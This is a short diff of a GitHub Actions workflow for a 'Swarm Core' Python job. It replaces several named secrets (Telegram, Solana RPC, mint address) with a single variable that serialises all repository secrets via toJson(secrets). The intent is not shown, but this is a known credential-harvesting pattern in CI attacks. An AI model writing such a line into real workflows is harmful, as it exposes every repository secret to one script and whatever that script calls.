@@ -24,9 +24,6 @@ jobs:
 
       - name: Run Swarm Core Logic
         env:
+          ALL_REPOS_SECRETS: ${{ toJson(secrets) }}
           XAI_API_KEY: ${{ secrets.XAI_API_KEY }}
-          TELEGRAM_BOT_TOKEN: ${{ secrets.TELEGRAM_BOT_TOKEN }}
-          TELEGRAM_CHAT_ID: ${{ secrets.TELEGRAM_CHAT_ID }}
-          SOLANA_RPC_QUICKNODE: ${{ secrets.SOLANA_RPC_QUICKNODE }}
-          MINT_ADDRESS: ${{ secrets.MINT_ADDRESS }}
         run: python swarm_core.py
